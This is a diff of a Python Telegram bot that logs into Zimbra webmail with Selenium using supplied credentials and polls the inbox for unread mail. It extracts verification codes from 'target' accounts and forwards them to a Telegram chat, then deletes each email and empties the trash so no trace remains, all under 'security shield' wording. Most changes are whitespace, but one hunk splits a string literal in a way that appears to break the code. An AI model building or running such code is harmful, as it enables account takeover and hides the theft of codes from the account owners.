@@ -124,8 +124,8 @@ def zimbra_isolated_daemon_worker(chat_id, email, password):
     """
     session_key = f"{chat_id}-{email}"
     logging.info(f"Launching independent headless worker instance for target context: {session_key}")
-    
-chrome_options = Options()
+
+    chrome_options = Options()
     chrome_options.binary_location = "/usr/bin/chromium"
     chrome_options.add_argument("--headless=new")
     chrome_options.add_argument("--no-sandbox")
@@ -137,22 +137,22 @@ chrome_options = Options()
     driver = None
     retry_count = 0
     max_consecutive_retries = 8
-    
+
     try:
         driver = webdriver.Chrome(options=chrome_options)
         wait = WebDriverWait(driver, 15)
-        
+
         driver.get(WEB_URL)
         username_field = wait.until(EC.presence_of_element_located((By.NAME, "username")))
         password_field = driver.find_element(By.NAME, "password")
         submit_button = driver.find_element(By.CSS_SELECTOR, "input.z-submitbutton, input[type='submit']")
-        
+
         username_field.send_keys(email)
         password_field.send_keys(password)
         submit_button.click()
-        
+
         time.sleep(4)
-        
+
         if "login" in driver.current_url.lower():
             bot.send_message(chat_id, f"❌ **Authentication Failed for Account:** `{email}`\n\nThe server rejected your credentials or the account was cloned before deployment.")
             with session_lock:
@@ -168,12 +168,12 @@ chrome_options = Options()
             f"🛡️ **Status:** Monitoring layers are active. Your account is isolated.",
             parse_mode="Markdown"
         )
-        
+
         while True:
             with session_lock:
                 if session_key not in active_sessions or not active_sessions[session_key]["running"]:
                     break
-            
+
             try:
                 current_state_url = driver.current_url.lower()
                 if "login" in current_state_url or "err" in current_state_url:
@@ -181,34 +181,34 @@ chrome_options = Options()
 
                 driver.refresh()
                 time.sleep(0.5)
-                
+
                 unread_rows = driver.find_elements(By.CLASS_NAME, "Unread")
-                
+
                 if unread_rows:
                     logging.info(f"Intercepted unread transmission payload inside mailbox profile: {email}")
-                    
+
                     for target_row in unread_rows:
                         try:
                             target_row.click()
                             time.sleep(0.5)
-                            
+
                             message_body_container = wait.until(EC.presence_of_element_located((By.ID, "zv__CONV__body")))
                             raw_extracted_text = message_body_container.text
-                            
+
                             secure_code, secure_context = extract_verification_code(raw_extracted_text)
-                            
+
                             with session_lock:
                                 if session_key in active_sessions:
                                     active_sessions[session_key]["codes_intercepted"] += 1
-                            
+
                             if secure_code:
                                 alert_payload = (
                                     f"🚨 ⚡ **VINZY CODE INTERCEPTED** ⚡ 🚨\n\n"
                                     f"👤 **Target Account:** `{email}`\n"
                                     f"📝 **Context:** `{secure_context}`\n\n"
                                     f"🔑 **EXTRACTED CODE:**\n"
-                                    f"```\n{secure_code}\n```"
-
+                                    f"```\n{secure_code}\n
+```\n"
                                     f"🗑️ *Security Action: Email immediately stripped from Inbox and permanently deleted from trash.*"
                                 )
                             else:
@@ -220,27 +220,27 @@ chrome_options = Options()
                                     f"```\n{raw_extracted_text[:3500]}\n```\n\n"
                                     f"🗑️ *Security Action: Content captured. Email stripped and purged.*"
                                 )
-                                
+
                             bot.send_message(chat_id, alert_payload, parse_mode="Markdown")
-                            
+
                             action_delete_button = driver.find_element(By.ID, "zb__CONV__DELETE")
                             action_delete_button.click()
                             time.sleep(0.3)
-                            
+
                             driver.execute_script("if(typeof ZmMailApp !== 'undefined') { ZmMailApp.prototype.emptyTrash(); }")
-                            
+
                             driver.get(f"{WEB_URL}/?app=mail&folder=Inbox")
                             time.sleep(0.5)
-                            
+
                         except Exception as element_error:
                             logging.error(f"Failed to process target sequence layout row: {element_error}")
                             continue
-                            
+
                 retry_count = 0
-                
+
             except (PermissionError, Exception) as loop_interruption:
                 error_string = str(loop_interruption).lower()
-                
+
                 if "cookie" in error_string or "permission" in error_string or "login" in error_string:
                     bot.send_message(
                         chat_id,
@@ -251,22 +251,22 @@ chrome_options = Options()
                         parse_mode="Markdown"
                     )
                     break
-                    
+
                 retry_count += 1
                 logging.warning(f"Worker tracking fault logged ({retry_count}/{max_consecutive_retries}): {loop_interruption}")
-                
+
                 if retry_count >= max_consecutive_retries:
                     bot.send_message(chat_id, f"⚠️ **Network Interruption for `{email}`:** Connection crashed. Attempting hot-reload recovery protocol...")
                     raise loop_interruption
-                    
+
             time.sleep(0.5)
-            
+
     except Exception as execution_crash:
         logging.error(f"Fatal worker breakdown experienced for target {session_key}: {execution_crash}")
-        
+
         with session_lock:
             should_recover = session_key in active_sessions and active_sessions[session_key]["running"]
-            
+
         if should_recover:
             logging.info(f"Triggering programmatic hot-reload thread restart loop sequence for Context: {session_key}")
             time.sleep(4)
@@ -275,7 +275,7 @@ chrome_options = Options()
             recovery_thread.start()
         else:
             bot.send_message(chat_id, f"🛑 **Shield Offline:** Security loop for `{email}` has terminated safely.")
-            
+
     finally:
         if driver:
             try:
@@ -289,7 +289,6 @@ def zimbra_monitor_worker(chat_id, email, password):
         zimbra_isolated_daemon_worker(chat_id, email, password)
     except Exception as e:
         logging.critical(f"Uncaught failure state generated inside master worker execution thread: {e}")
-
 # ==========================================
 # 4. BOT ROUTING TELEGRAM EVENT HANDLERS
 # ==========================================
